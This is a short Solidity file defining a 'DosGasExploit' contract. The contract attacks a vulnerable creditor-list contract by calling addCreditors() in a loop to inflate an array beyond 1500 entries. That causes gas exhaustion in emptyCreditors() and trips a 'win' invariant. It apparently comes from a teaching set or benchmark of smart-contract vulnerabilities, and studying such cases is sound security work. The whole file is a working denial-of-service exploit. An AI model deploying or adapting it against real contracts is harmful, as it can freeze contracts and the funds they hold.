pragma solidity ^0.4.25;

interface IDosGas {
    function addCreditors() external returns (bool);
    function emptyCreditors() external;
    function numberCreditors() external view returns (uint);
    function iWin() external view returns (bool);
}

contract DosGasExploit {
    IDosGas public vulnerable;

    constructor(address _target) public {
        vulnerable = IDosGas(_target);
    }

    // Inflate the creditorAddresses array to cause DoS and invariant violation
    function attack() public {
        // Call addCreditors() enough times to push total length beyond 1500
        // 5 calls * 350 = 1750
        for (uint i = 0; i < 5; i++) {
            vulnerable.addCreditors();
        }
    }

    // This will likely fail due to gas exhaustion or skipped intentionally
    function attemptEmpty() public {
        vulnerable.emptyCreditors();
    }

    // View current length and win status
    function checkStatus() public view returns (uint length, bool won) {
        length = vulnerable.numberCreditors();
        won = vulnerable.iWin();
    }
}

